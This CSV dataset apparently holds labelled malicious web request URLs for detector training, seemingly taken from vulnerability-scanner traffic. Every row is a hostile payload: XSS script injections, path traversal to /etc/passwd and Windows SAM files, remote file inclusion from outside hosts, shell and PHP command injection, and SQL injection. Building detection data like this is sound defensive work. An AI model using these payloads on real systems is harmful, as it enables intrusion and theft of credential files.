url,label
/scripts/news.scr.php?globals[pth][classes]=@rfiurl?globals[pth][classes]=@rfiurl?,1
/servlet/msgpage?action=test&msg=<script>alert('vulnerable')</script>,1
/bin/fileseek.cgi?foot=&head=....//....//....//....//....//....//....//etc/passwd,1
/examples/jsp/checkbox/install.php?newlang=../../cpg_error.log\x00,1
/6wb70v0b.aspx?<script>cross_site_scripting.nasl</script>,1
"/top.php?stuff=""del\x09q67284925&rem\x09",1
/edittag/edittag.cgi?file=/../../../../../etc/passwd,1
/examples/jsp/jsp2/el/core/adodb/server.php?sql='adodb_sql_sql_injection.nasl,1
/phpmyadmin/store.cgi?startid=../../../../../../../../../etc/passwd\x00.html,1
/scripts/nx/common/cds/menu.inc.php?c_path=http://xxxxxxxx/,1
/mpcgi/fileseek.cgi?foot=&head=;cat /etc/passwd|,1
"/quagynka.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/main.php?logout=""ping;-w;7000;-n;1;1.2.3.4|rem;",1
/examples/jsp/cal/cgiwrap/cgiwrap_error_page_handling_xss.nasl,1
/cmsimple2_7/cmsimple/cms.php?pth['file']['config']=http://192.168.202.96:8080/frznctvhi0i5??,1
"/jdx255ea.nsf?<script>document.cookie=""testziyq=5055;""</script>",1
"/?<meta http-equiv=set-cookie content=""testuhsv=9753"">",1
/examples/servlets/servlet/help/index.php?help_file=../../../../../../../../../../../etc/passwd,1
"/o35zot2r.fts?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/sysuser/docmgr/htaccess.stm?path=<script>alert(document.cookie)</script>,1
"/n9xlumt5.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/help.php?q=""ping,-w,11000,-n,1,4.3.2.1&rem,",1
/fa8p8lr8.nsf?<script>cross_site_scripting.nasl</script>,1
/examples/servlets/servlet/themes/program/themesettings.inc.php?themesdir=/etc/passwd\x00,1
/examples/jsp/cal/mrtg.cgi?cfg=/../../../../../../../../../winnt/win.ini,1
"/?<script>document.cookie=""testtfvh=2141;""</script>",1
"/ygkjkngd.cfm?<meta http-equiv=set-cookie content=""testnago=4518"">",1
/cgis/pfdisplay.cgi?'\x0a/bin/cat /etc/passwd|',1
/en-us/account/lib/dbman_filter.inc.php?lib_path=/etc/passwd\x00,1
"/byrg33fw.aspx?<script>document.cookie=""testexuu=5340;""</script>",1
"/l13b77e5.pl?<meta http-equiv=set-cookie content=""testjvvf=7721"">",1
"/d44uk9h2.aspx?<script>document.cookie=""testmybc=2088;""</script>",1
/top.php?stuff='\x0drm\x09q15742122\x09#,1
"/<meta http-equiv=set-cookie content=""testtbbe=856"">",1
"/y8pmygrp.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/vmi8bb12.cfc?<meta http-equiv=set-cookie content=""testlerc=2575"">",1
"/h21y8w52.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/news/include/createdb.php?langfile;=http://cirt.net/rfiinc.txt??,1
/archive.php?scriptpath=http://192.168.202.96:8080/swgnhpydbq0t??,1
/606wkcop.htm?<script>cross_site_scripting.nasl</script>,1
"/mv8wxfy9.idc?<meta http-equiv=set-cookie content=""testrhbc=8184"">",1
/cacti/plugins/safehtml/htmlsax3.php?dir[plugins]=/etc/passwd\x00,1
/cgi-exe/gw5/gwweb.exe?htmlver=aaa&get-context,1
"/quagynka.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/help.php?q=""ping\x09-w\x099000\x09-n\x091\x094.3.2.1&rem\x09",1
"/top.php?stuff=""\x0duname\x09>q41641295\x09#",1
/eg2u8pbv.mscgi?<script>cross_site_scripting.nasl</script>,1
"/6wb70v0b.idc?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/169okeyj.asp?<meta http-equiv=set-cookie content=""testxeoi=3573"">",1
/6wb70v0b.dll?<script>cross_site_scripting.nasl</script>,1
/examples/servlets/servlet/bb_func_txt.php?pathtofiles=/etc/passwd\x00,1
"/fc9t54l7.idc?<meta http-equiv=set-cookie content=""testggad=2000"">",1
"/t3af3tdz.html?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/m2fpztty.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/jsp2/jspx/netauth.cgi?cmd=show&page=../../../../../../../../../etc/passwd,1
"/bxnyrhmh.cgi?<meta http-equiv=set-cookie content=""testmjct=1867"">",1
"/cgi-bin/login.php?user=""><script>alert('pubcookie_xss.nasl');</script>",1
"/yef5f3d5.jspa?<meta http-equiv=set-cookie content=""testcrcv=6167"">",1
"/en-us/33y9gcqq.cgi?<meta http-equiv=set-cookie content=""testnvxc=4301"">",1
"/zln2hm2z.dll?<script>document.cookie=""testblcp=8120;""</script>",1
/examples/jsp/colors/sysinfo.cgi?action=systemdoc&name=sysinfo_name_cmd_exec.nasl;id,1
/igtf0zon.php?<script>cross_site_scripting.nasl</script>,1
"/en-us/fo564rei.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/vmi8bb12.fts?<script>document.cookie=""testlerc=2575;""</script>",1
/examples/jsp/checkbox/admin/plog-admin-functions.php?config[basedir]=/etc/passwd\x00,1
/eg2u8pbv.html?<script>cross_site_scripting.nasl</script>,1
"/en-us/ddoworrl.htm?<meta http-equiv=set-cookie content=""testvlau=8517"">",1
"/zuihld5m.mscgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/l13b77e5.mscgi?<script>document.cookie=""testjvvf=7721;""</script>",1
/cgi-bin/htgrep?file=index.html&hdr=/etc/passwd,1
/htbin/r.cgi?file=../../../../../../../../../../etc/passwd,1
/examples/jsp/colors/javascript.php?abs_path=/etc/passwd\x00,1
/recordings/index.php?search=<script>foo</script>,1
/cgi-exe/a1disp3.cgi?../../../../../../../../../../etc/passwd,1
/main.php?logout=ping;-w;11000;-n;1;1.2.3.4&rem;,1
"/<script>document.cookie=""testgjbe=8505;""</script>",1
"/miz4r5hz.cfc?<script>document.cookie=""testviqu=1270;""</script>",1
/news/include/createdb.php?langfile;=http://192.168.202.118:8080/ghl9il??,1
"/1qwv2p5p.asp?<script>document.cookie=""testvqcy=252;""</script>",1
/phpmyadmin/documentation.html?phpmyadmin=1',1
/examples/jsp/colors/welcome.php?custom_welcome_page=/etc/passwd\x00,1
/en-us/dda2qr7j.html?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/sessions/add_url.htm?node=<script>alert('xss')</script>,1
/domainfiles/*//../../../../../../../../../../etc/passwd,1
/bl8sefdm.jsp?<script>cross_site_scripting.nasl</script>,1
/j2kdmfw4.nsf?<script>cross_site_scripting.nasl</script>,1
/include/scripts/export_batch.inc.php?dir=http://192.168.202.118:8080/tzhfyzkbomspvm?,1
/phpmyadmin/documentation.html?phpmyadmin=/\../\../\../\../\../\../\../etc/passwd,1
/examples/jsp/num/index.php?show=../../../../../../../../../../../etc/passwd\x00,1
/scripts/1331909165-ror_session_fixation.nasl,1
"/b4vng02k.jsp?<meta http-equiv=set-cookie content=""testtrlh=3672"">",1
/gy23xnjq.x?<script>cross_site_scripting.nasl</script>,1
"/en-us/esmozg5d.mscgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/phpmyadmin/documentation.html?phpmyadmin=<!--,1
"/help.php?q=""|ping\xa0-w\xa07000\xa0-n\xa01\xa01.2.3.4|rem\xa0",1
/examples/jsp/jsp2/jspx/search.pl?form=../../../../../../etc/passwd\x00,1
/examples/jsp/checkbox/inc/formmail.inc.php?script_root=../templates/mail.tpl.txt\x00,1
"/if69ddo1.cfm?<meta http-equiv=set-cookie content=""testiabz=5220"">",1
/cgi-bin/sendcard.php?view=1&id='sendcard_sql.nasl,1
"/8t9v8k7x.dll?<script>document.cookie=""testhvje=9403;""</script>",1
"/_mem_bin/formslogin.asp?\""><script>alert('vulnerable')</script>",1
/phpmyadmin/awstatstotals.php?sort={${phpinfo()}}{${exit()}},1
/ny1b3qq4.php?<script>cross_site_scripting.nasl</script>,1
"/pxagj7n7.do?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/javascript/.htaccess.sfish/-->"">'>'""<sfi000014v868621>",1
/ows-bin/a1disp3.cgi?../../../../../../../../../../etc/passwd,1
"/5o9zq43e.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/eg2u8pbv.do?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/a0imiuf1.jspa?<script>document.cookie=""testxqrn=4654;""</script>",1
/cgi-bin/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331923195')</script>,1
/manager/squirrelcart/cart_content.php?cart_isp_root=/etc/passwd\x00,1
/eei78ore.mscgi?<script>cross_site_scripting.nasl</script>,1
"/s7qus4g3.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/ewc3rz1l.cgi?<meta http-equiv=set-cookie content=""testkgqo=204"">",1
/bn857frh.asp?<script>cross_site_scripting.nasl</script>,1
/zqqemp6j.cfm?<script>cross_site_scripting.nasl</script>,1
/cgi-sys/pfdisplay.cgi?'\x0a/bin/cat /etc/passwd|',1
"/t578vqea.fts?<script>document.cookie=""testsory=7676;""</script>",1
/scripts/sawmillcl.exe?ho+{complete_version},1
/cgi-bin/index.php?search=<script>alert('cmsimple_search_xss.nasl');</script>&function=search,1
"/ydexw8by.x?<script>document.cookie=""testulex=4996;""</script>",1
/script/ident/ident.inc.php?path_inc=http://192.168.202.118:8080/tzhfyzkbomspvm?,1
"/if69ddo1.fts?<meta http-equiv=set-cookie content=""testiabz=5220"">",1
/scripts/sitemap.scr.php?globals[pth][classes]=http://192.168.202.118:8080/moclyxlwqyfjnp??,1
"/admin.php?""><script>alert(409965565951)</script><""",1
"/examples/servlets/servlet/login.php?course=""><script>alert(atutor_xss.nasl)</script>",1
/news.php?scriptpath=@rfiurl?scriptpath=@rfiurl?,1
"/5o9zq43e.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/qczkquis.mscgi?<script>document.cookie=""testkwlg=5591;""</script>",1
/en-us/7o5qp766.mscgi?<script>cross_site_scripting.nasl</script>,1
/cgi-bin/pfdispaly.cgi?../../../../../../etc/passwd,1
/h5sc3gxy.x?<script>cross_site_scripting.nasl</script>,1
"/hipkz026.fts?<script>document.cookie=""testyrbs=2855;""</script>",1
"/en-us/33y9gcqq.jspa?<script>document.cookie=""testnvxc=4301;""</script>",1
/t7tm4m0b.cfc?<script>cross_site_scripting.nasl</script>,1
/search-results.dot?search_query=<script>alert(413796083533)</script>,1
/en-us/account/phptonuke.php?filnavn=/etc/passwd,1
"/d765w06j.x?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/jdx255ea.pl?<meta http-equiv=set-cookie content=""testziyq=5055"">",1
/examples/jsp/sessions/yabb.pl?board=news&action=display&num=../../../../../../etc/passwd\x00,1
"/fc9t54l7.aspx?<script>document.cookie=""testggad=2000;""</script>",1
/scripts/index.php?option=frontpage&itemid=2|system(id)|1331909360,1
/https-admserv/bin/index?/<script>alert(document.cookie)</script>,1
/en-us/account/anacondaclip.pl?template=../../../../../../../../../../../../../../../etc/passwd,1
"<meta http-equiv=set-cookie content=""testblcp=8120"">",1
/edzaia0i.do?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/jsp2/jspx/popup.php?include_path=/etc/passwd\x00,1
"/9kr0ih0v.kspx?<script>document.cookie=""testzgnm=1183;""</script>",1
/login.php/login.php?lang=../../../../../ubbc.js\x00,1
/scripts/index.php?option=frontpage&itemid=2|system(id)|1331904229,1
"/lsoix5h3.pl?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/a0imiuf1.htm?<script>document.cookie=""testxqrn=4654;""</script>",1
/en-us/n9xlumt5.pl?<script>cross_site_scripting.nasl</script>,1
"<meta http-equiv=set-cookie content=""testfutf=1550"">",1
/en-us/account/popup.php?include_path=/etc/passwd\x00,1
/j734qobz.fts?<script>cross_site_scripting.nasl</script>,1
/mpcgi/powerup/r.cgi?file=../../../../../../../../../../etc/passwd,1
"/qhvu0pdg.pl?<meta http-equiv=set-cookie content=""testchuc=2100"">",1
/cgi-914/ion-p.exe?page=c:\winnt\repair\sam,1
"/xfkun1ku.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/ht8pn8uq.pl?<script>cross_site_scripting.nasl</script>,1
"/weq93ppb.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/7dbjwpw6.cfm?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/jsp2/el/sugarcrm/modules/users/login.php?theme=../../../../../../../etc/passwd\x00,1
/esmozg5d.fts?<script>cross_site_scripting.nasl</script>,1
/scripts/www/delivery/ac.php?bannerid=-290+or+1=1,1
"/ddoworrl.cfm?<meta http-equiv=set-cookie content=""testvlau=8517"">",1
"/main.php?logout=""ping\x0c-w\x0c10000\x0c-n\x0c1\x0c4.3.2.1&rem\x0c",1
"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo"";ls+-l;rm+/tmp/hwxugbkmva""",1
/examples/jsp/jsp2/el/common/visiteurs/include/menus.inc.php?lvc_include_dir=/etc/passwd\x00,1
/manager/libraries/adodb/server.php?sql='adodb_sql_sql_injection.nasl,1
/examples/jsp/jsp2/el/search.pl?form=../../../../../../etc/passwd\x00,1
/0rufe52p.php?<script>cross_site_scripting.nasl</script>,1
/scripts/gbadmin.cgi?action=change_adminpass,1
ftp://192.168.27.102/*<apache_mod_proxy_ftp_glob_xss.nasl>,1
/p043snfr.jspa?<script>cross_site_scripting.nasl</script>,1
/webcgi/ion-p?page=../../../../../etc/passwd,1
/jscript.php?my_ms[root]=http://192.168.202.118:8080/ghl9il??,1
/rbec2ohx.kspx?<script>cross_site_scripting.nasl</script>,1
/3rdparty/phpmyadmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../,1
"/de3v2dd9.do?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/vac1l5vm.do?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/jdx255ea.jsp?<meta http-equiv=set-cookie content=""testziyq=5055"">",1
/include/scripts/send_email_cache.php?dir=http://192.168.202.118:8080/moclyxlwqyfjnp?,1
"/mv8wxfy9.cgi?<meta http-equiv=set-cookie content=""testrhbc=8184"">",1
/dir_thatware/config.php?root_path=http://192.168.202.96:8080/4dckqcc0acprbz?',1
"/8t9v8k7x.idc?<script>document.cookie=""testhvje=9403;""</script>",1
/static//\..\..\..\..\..\..\..\..\windows/win.ini,1
/scripts/listrec.pl?app=qmh-news&template=;ls /etc|,1
/cgi-bin/js/scripts.php?load=/boot.ini\x00,1
/rbec2ohx.x?<script>cross_site_scripting.nasl</script>,1
/cgi-bin/test-cgi.exe?<script>alert(document.cookie)</script>,1
/6wb70v0b.pl?<script>cross_site_scripting.nasl</script>,1
/gepi/gestion/savebackup.php?filename=http://cirt.net/rfiinc.txt?&cmd=cat/etc/passwd,1
"/mv8wxfy9.exe?<meta http-equiv=set-cookie content=""testrhbc=8184"">",1
/scripts/wsnsa.dll/wservice=wsbroker1/webutil/ping.p,1
"/s7qus4g3.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/i7prbs22.mscgi?<meta http-equiv=set-cookie content=""testjnre=7328"">",1
"/nyjgaorz.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/cgi-bin/index.php?id='union/**/select/**/0,0,1673700990,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--",1
/cgi-bin/index.php?lng=../system_footer&sensor_program=phpsysinfo_241.nasl,1
"/h21y8w52.x?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/examples/jsp/cal/webappmon.exe?ins=nowait&act=natping&sel=""255.255.255.255 & id&""",1
"/azcrfs8d.nsf?<script>document.cookie=""testjpdr=9205;""</script>",1
"/en-us/ddoworrl.cfc?<script>document.cookie=""testvlau=8517;""</script>",1
/0rufe52p.fts?<script>cross_site_scripting.nasl</script>,1
/examples/jsp/jsp2/el/showproduct.php?product=1',1
/h21y8w52.mscgi?<script>cross_site_scripting.nasl</script>,1
"/examples/jsp/jsp2/jspx/forumdisplay.php?fid=21""><script>x</script>",1
/examples/jsp/sessions/file.cgi?name=/eventcache/../../../../../../../../../../../boot.ini,1
/examples/servlets/servlet/phptonuke.php?filnavn=/etc/passwd,1
"/<img src=""javascript:alert(cross_site_scripting.nasl);"">.dll",1
/includes/converter.inc.php?include_path=/etc/passwd\x00,1
"/popup.php?poll_ident=<script>alert(""wvs-xss-magic-string-411445575285"")</script>",1
/recordings/include/sql.php?include_path=/etc/passwd\x00,1
"/a0imiuf1.idc?<script>document.cookie=""testxqrn=4654;""</script>",1
/scripts/ui/login?user=nessus-1331909161,1
"/top.php?stuff=""ver\x09>q12423295&rem\x09",1
/top.php?stuff='\x0duname\x09>q88128927\x09#,1
/examples/jsp/num/?mod=read&id=../../../../../../../../../../../../../etc/passwd\x00,1
"/gy23xnjq.do?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/en-us/ddoworrl.htm?<script>document.cookie=""testvlau=8517;""</script>",1
/igtf0zon.exe?<script>cross_site_scripting.nasl</script>,1
/vac1l5vm.x?<script>cross_site_scripting.nasl</script>,1
/6qbynt4f.dll?<script>cross_site_scripting.nasl</script>,1
"/cgi-bin/index.php?op=default&date=200607' union select 1,199642765,1,1,1,1,1,1,1,1--&blogid=1",1
"/m4kkjf8l.exe?<script>document.cookie=""testyglc=8988;""</script>",1
/examples/jsp/num/sugarcrm/modules/users/login.php?theme=../../../../../../../etc/passwd\x00,1
"/de3v2dd9.jsp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/examples/jsp/checkbox/calendar_admin.pl?config=|cat /etc/passwd|,1
/manager/help/index.php?help_file=../../../../../../../../../../../etc/passwd,1
"/odzk29aa.asp?<script>document.cookie=""testtfvh=2141;""</script>",1
"/zmvq66jy.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/nyvbv05h.nsf?<script>document.cookie=""testftxz=5980;""</script>",1
"/rpxyx07v.idc?<meta http-equiv=set-cookie content=""testbnli=1975"">",1
"/main.php?stuff=""&del\x0cq64367569&rem\x0c",1
/member/usercp_menu.php?script_folder=http://192.168.202.118:8080/tzhfyzkbomspvm?,1
/..%5c..%5c..%5c..%5c..%5c../windows/repair/sam,1
/recordings/shoutbox.php?conf=../../../../../../../../etc/passwd,1
"/scripts/index.php?act=sm_window&page=event&day=-1 union select 1,1331919214,1014126559 --",1
/examples/jsp/error/store.php?crn=42'&action=show&show_products_mode=cat_click,1
"/examples/jsp/num?username=""<script>foo</script",1
/scripts/index.php?edit=nonexistant859870284,1
/cgi-bin/commerce.cgi?page=../../../../../../../../../../etc/passwd\x00index.html,1
/0w155a7c.pl?<script>cross_site_scripting.nasl</script>,1
/recordings/help.php?section='qualiteam_xcart_sql_xss.nasl,1
/examples/jsp/jsp2/el/starnet/addons/slideshow_full.php?album_name='1654493777,1
"/rpxyx07v.htm?<meta http-equiv=set-cookie content=""testbnli=1975"">",1
/script/ident/disconnect.php?path_inc=@rfiurl,1
/cgi-bin/search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini,1
/scripts/1331923142-ror_session_fixation.nasl,1
/forum1_professionnel.asp?n=1771&amp;nn=/....../boot.ini&amp;page=1,1
"/rpxyx07v.kspx?<script>document.cookie=""testbnli=1975;""</script>",1
/topsitesdirectory/help.php?sid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,1
"/jdx255ea.nsf?<meta http-equiv=set-cookie content=""testziyq=5055"">",1
"/main.php?stuff=""uname\x09>q84368944\x09#",1
/examples/jsp/sessions/shoutbox.php?conf=../../../../../../../../etc/passwd,1
/cacti/mapserv.exe?map=mapserver_detect.nasl.map,1
"/top.php?stuff=""ping;-w;9000;-n;1;1.2.3.4&rem;",1
"//<body><script/src=""http://www.example.com/test?rnd=q72968617""></script>",1
"/rpc.php?q=\""><script>alert(document.cookie)</script>",1
"/main.php?logout=""ping,-w,7000,-n,1,4.3.2.1|rem,",1
/examples/jsp/jsp2/jspx/index.php?entry=',1
/examples/jsp/sessions/menu_dx.php?site_path=../../../../../../../../../../etc/passwd\x00,1
/en-us/h5sc3gxy.html?<script>cross_site_scripting.nasl</script>,1
/mxhelp/cgi-bin/namazucgi?lang=/../../../../../../../../../../../../../boot.ini,1
/cgi-bin/shared/help.php?page=../../../../../../../../../../etc/passwd\x00,1
/cgi-bin/lib/owl_api.php?xrms_file_root=../../../../../../../../../../../../etc/passwd\x00,1
/examples/jsp/sessions/engine/admin/admin.php?id_user=../../../../../../../../../etc/passwd,1
/examples/servlets/servlet/news.php?prevnext=1'phpnews_prevnext_sql_injection.nasl,1
/cgi-win/r.cgi?file=../../../../../../../../../../etc/passwd,1
/examples/jsp/colors/forum_2.php?msg=10&return=<script>foo</script>,1
/dda2qr7j.htm?<script>cross_site_scripting.nasl</script>,1
"/?<script>document.cookie=""testjvvf=7721;""</script>",1
/examples/jsp/cal/mailbox.php3?actionid=6&server=x&imapuser=x';somesql&pass=x,1
"/en-us/33y9gcqq.cgi?<script>document.cookie=""testnvxc=4301;""</script>",1
"/g3w7y7u5.pl?<meta http-equiv=set-cookie content=""testbfpq=3326"">",1
/cgi-bin/cleartrust/ct_logon.asp?ctloginerrormsg=<script>alert(1)</script>,1
"/tuwjta1w.exe?<meta http-equiv=set-cookie content=""testpokn=7494"">",1
"/x7pclv4s.idc?<meta http-equiv=set-cookie content=""testiulz=3709"">",1
/r3le3om5.dll?<script>cross_site_scripting.nasl</script>,1
/cgi-bin/c32web.exe/getimage?imagename=customeremail.txt\x00.pdf,1
"/en-us/<script>document.cookie=""testttvs=7163;""</script>",1
"/0u75ldxq.mscgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/azcrfs8d.kspx?<script>document.cookie=""testjpdr=9205;""</script>",1
"/nyvbv05h.asp?<meta http-equiv=set-cookie content=""testftxz=5980"">",1
/examples/servlets/servlet/embed/day.php?path=/etc/passwd\x00,1
"/iv5vkgam.cfm?<script>document.cookie=""testfosd=94;""</script>",1
"/6qbynt4f.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
"/top.php?stuff=""ping\x0b-w\x0b9000\x0b-n\x0b1\x0b1.2.3.4|rem\x0b",1
/dda2qr7j.nsf?<script>cross_site_scripting.nasl</script>,1
"/j4drbkil.fts?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
/opensiteadmin/scripts/classes/loginmanager.php?path=@rfiurl\x00,1
/top.php?stuff=ping;-w;9000;-n;1;4.3.2.1|rem;,1
"/5o9zq43e.html?<img src=""javascript:alert(cross_site_scripting.nasl);"">",1
